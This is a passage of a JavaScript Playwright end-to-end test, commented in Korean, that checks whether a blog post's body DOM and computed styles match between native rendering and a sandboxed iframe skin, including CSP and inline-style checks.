       본문 렌더 계약과는 별개다. 여기서는 감싼 span 만 벗겨 견주고,
       그 차이 자체는 아래에서 따로 기록한다.
  */

  const shapeOf = (el) => {

    const clone = el.cloneNode(true);

    clone.querySelectorAll(".post-highlight").forEach(mark => {
      while (mark.firstChild) mark.parentNode.insertBefore(mark.firstChild, mark);
      mark.remove();
    });

    return clone.innerHTML
      .replace(/ ?imory-pb-[a-z0-9-]+/g, "")
      .replace(/ style="[^"]*"/g, "")
      .replace(/ class=""/g, "");

  };


  return {
    shape: shapeOf(root),

    /* 알려진 차이(§K-6)를 숫자로 남긴다 */
    readerHighlights: root.querySelectorAll(".post-highlight").length,

    container: pick(root),
    highlight: pick(root.querySelector(".post-inline-highlight")),
    ruleMarker: pick(root.querySelector(".post-para-rule")),
    ruleBox: pick(root.querySelector(".post-para-rule-box")),
    pointColor: pick(root.querySelector(".post-inline-color")),
    gap: pick(root.querySelector(".post-body-paragraph-gap")),
    copyBox: pick(root.querySelector(".post-copy-box")),
    copyBoxBody: pick(root.querySelector(".post-copy-box-body")),
    divider: pick(root.querySelector(".post-divider")),

    /* 조작 UI 는 읽는 화면에만 붙는다 — 양쪽 다 있어야 한다 */
    copyButtons: root.querySelectorAll(".post-copy-box-copy").length
  };

};


function bodyParityDiff(a, b) {

  if (!a || !b) return ["(한쪽이 없다)"];

  const keys =
    new Set([...Object.keys(a), ...Object.keys(b)]);

  return [...keys].filter(
    k => JSON.stringify(a[k]) !== JSON.stringify(b[k])
  ).map(
    k => k + ": native=" + JSON.stringify(a[k]) +
         " / sandbox=" + JSON.stringify(b[k])
  );

}


async function runBodyParity(browser) {

  console.log("\n[bodyparity] 같은 글, native 와 프레임의 본문");

  const sandboxPkg = readSandboxPkg();

  const nativePkg = JSON.parse(JSON.stringify(sandboxPkg));
  delete nativePkg.renderMode;


  /* --- native (같은 스킨, renderMode 만 뺐다) ------------ */

  const native =
    await openPublicPath(
      browser, nativePkg, "/post/101", { sandbox: false }
    );

  await native.page.waitForFunction(
    () => {
      const el = document.querySelector('[data-imory-region="post-body"]');
      return el && el.textContent.indexOf('첫 번째 글의 본문') !== -1;
    },
    null,
    { timeout: 20000 }
  ).catch(() => {});

  /*
    ★ 읽는 이의 하이라이트 표시는 본문을 그린 **뒤** 비동기로
    덧칠된다(renderPostHighlights). 본문 글자만 기다리고 재면
    덧칠 전에 찍히는 바퀴가 생겨서 아래 "알려진 차이" 절이
    가끔 0/0 으로 보인다 — 그 표시까지 기다린다.
  */

  await native.page.waitForFunction(
    () => document.querySelectorAll(".post-highlight").length > 0,
    null,
    { timeout: 20000 }
  ).catch(() => {});

  const nativeData =
    await native.page.evaluate(BODY_PARITY_PROBE);

  check("[bodyparity] native 가 스킨의 post-body region 에 본문을 그렸다",
    !nativeData.missing && Boolean(nativeData.highlight),
    JSON.stringify(nativeData).slice(0, 120));

  check("[bodyparity] native 페이지 오류 없음",
    native.pageErrors.length === 0, native.pageErrors.join(" | "));

  await native.ctx.close();


  /* --- sandbox ------------------------------------------ */

  const sandbox =
    await openPublicPath(browser, sandboxPkg, "/post/101");

  const frame =
    await waitForSandboxPage(sandbox.page, "post");

  check("[bodyparity] POST 가 프레임에서 그려진다", Boolean(frame));

  if (!frame) {
    await sandbox.ctx.close();
    return;
  }

  await frame.waitForFunction(
    () => {
      const el = document.querySelector('[data-imory-region="post-body"]');
      return el && el.textContent.indexOf('첫 번째 글의 본문') !== -1;
    },
    null,
    { timeout: 20000 }
  ).catch(() => {});

  const frameData =
    await frame.evaluate(BODY_PARITY_PROBE);


  /* --- 비교 --------------------------------------------- */

  check("[bodyparity] ★ 본문 DOM 구조가 글자 단위로 같다",
    nativeData.shape === frameData.shape,
    (nativeData.shape || "").slice(0, 120) + "\n   vs\n   " +
    (frameData.shape || "").slice(0, 120));

  const parts = [
    ["컨테이너", "container"],
    ["형광펜", "highlight"],
    ["강조선 마커", "ruleMarker"],
    ["강조선 상자", "ruleBox"],
    ["포인트 색", "pointColor"],
    ["문단 간격", "gap"],
    ["복사 상자", "copyBox"],
    ["복사 상자 내용", "copyBoxBody"],
    ["구분선", "divider"]
  ];

  for (const [label, key] of parts) {

    const diffs =
      bodyParityDiff(nativeData[key], frameData[key]);

    check("[bodyparity] ★ " + label + "의 계산 스타일이 같다",
      diffs.length === 0,
      diffs.join("\n     "));

  }


  /*
    ★ 회귀 표지 — 이 두 값이 기본값으로 돌아가면 CSS 가 안 왔다는
    뜻이다. 위 비교만으로는 "둘 다 똑같이 빠진" 경우를 못 잡는다.
  */

  check("[bodyparity] ★ 형광펜이 실제로 class 규칙을 받았다 (여백·clone)",
    frameData.highlight &&
    parseFloat(frameData.highlight.paddingLeft) > 0 &&
    frameData.highlight.boxDecorationBreak === "clone",
    JSON.stringify(frameData.highlight &&
      {
        paddingLeft: frameData.highlight.paddingLeft,
        boxDecorationBreak: frameData.highlight.boxDecorationBreak
      }));

  check("[bodyparity] ★ 강조선 마커는 프레임에서도 display:none",
    frameData.ruleMarker && frameData.ruleMarker.display === "none",
    frameData.ruleMarker && frameData.ruleMarker.display);

  check("[bodyparity] ★ 복사 상자가 프레임에서도 상자로 그려진다",
    frameData.copyBox &&
    parseFloat(frameData.copyBox.borderLeft) > 0 &&
    frameData.copyBox.backgroundColor !== "rgba(0, 0, 0, 0)",
    JSON.stringify(frameData.copyBox &&
      {
        borderLeft: frameData.copyBox.borderLeft,
        backgroundColor: frameData.copyBox.backgroundColor
      }));

  check("[bodyparity] ★ 복사 버튼은 양쪽에 같은 개수로 붙는다",
    nativeData.copyButtons === frameData.copyButtons &&
    frameData.copyButtons === 1,
    nativeData.copyButtons + " / " + frameData.copyButtons);


  /*
    ★ inline style 은 여전히 하나도 없어야 한다. class 규칙을
    들여왔다고 SANDBOX-3.1 의 결론이 느슨해지지 않았는지 본다.
  */

  check("[bodyparity] ★ 프레임에 style 속성이 하나도 없다",
    (await frame.evaluate(
      () => document.querySelectorAll("#sandboxFrameRoot [style]").length
    )) === 0);

  check("[bodyparity] ★ 본문 CSS 두 벌을 프레임이 실제로 읽었다",
    (await frame.evaluate(() =>
      [...document.styleSheets]
        .map(s => s.href || "")
        .filter(h => /posts-body-(shared|blocks)\.css/.test(h)).length
    )) === 2);

  /*
    ★ 알려진 차이 — 읽는 이의 하이라이트 표시(§K-6).

    native 는 본문을 그린 뒤 덧칠하고, 프레임 안에서는 아직
    덧칠하지 않는다. "언젠가 고칠 것"이 조용히 "고쳐진 줄 알았던
    것"으로 바뀌지 않도록 숫자로 못박아 둔다 — 프레임에서 표시가
    보이기 시작하면 이 줄이 먼저 실패한다.
  */

  check("[bodyparity] (알려진 차이) 하이라이트 표시는 native 에만 덧칠된다",
    nativeData.readerHighlights === 1 &&
    frameData.readerHighlights === 0,
    nativeData.readerHighlights + " / " + frameData.readerHighlights);


  check("[bodyparity] inline style CSP 위반이 없다",
    sandbox.pageErrors.filter(t => /inline style/i.test(t)).length === 0,
    sandbox.pageErrors.join(" | ").slice(0, 160));

  check("[bodyparity] 프레임 페이지 오류 없음",
    sandbox.pageErrors.length === 0, sandbox.pageErrors.join(" | "));

  await sandbox.ctx.close();

}


/* =========================================================
   RUN
========================================================== */

(async () => {

  playwright = await loadPlaywright(BROWSER);

  const parentServer = await startServer(PARENT_PORT);
  const sandboxServer = await startServer(SANDBOX_PORT);

  console.log(
    `SKIN SANDBOX E2E (SANDBOX-0 + SANDBOX-1) — ${BROWSER}\n` +
    `  parent : ${PARENT_ORIGIN}\n` +
    `  frame  : ${SANDBOX_ORIGIN}`
  );

  const browser = await playwright[BROWSER].launch();

  try {

    if (shouldRun("host")) await runHost();
    if (shouldRun("csp")) await runCsp();
    if (shouldRun("flag")) await runFlag(browser);

    if (shouldRun("ready")) {
      const r = await runReady(browser);
      await r.ctx.close();
    }

    if (shouldRun("reject")) await runReject(browser);
    if (shouldRun("isolate")) await runIsolate(browser);
    if (shouldRun("mobile")) await runMobile(browser);

    /* --- SANDBOX-1 --- */

    if (shouldRun("render")) {
      const r = await runRender(browser);
      if (r) await r.ctx.close();
    }

    if (shouldRun("payload")) await runPayload(browser);
    if (shouldRun("height")) await runHeight(browser);
    if (shouldRun("fallback")) await runFallback(browser);
    if (shouldRun("package")) await runPackage(browser);
    if (shouldRun("home")) await runHome(browser);

    /* --- SANDBOX-2 --- */

    if (shouldRun("pages")) await runPages(browser);
    if (shouldRun("bodyparity")) await runBodyParity(browser);
    if (shouldRun("surfaces")) await runSurfaces(browser);
    if (shouldRun("nav")) await runNav(browser);

    if (shouldRun("screens")) await runScreens(browser);

    if (shouldRun("authorjs")) await runAuthorJs(browser);
    if (shouldRun("authorjspages")) await runAuthorJsPages(browser);

    if (shouldRun("regress")) await runRegress();
    if (shouldRun("env")) await runEnv();

  } catch (err) {
    console.error("\n실행 중 오류:", err);
    failed += 1;
  } finally {
    await browser.close();
    parentServer.close();
    sandboxServer.close();
  }

  console.log(`\n${passed} passed, ${failed} failed`);
  if (failed) console.log("실패:\n  - " + failures.join("\n  - "));
  process.exit(failed ? 1 : 0);

})();
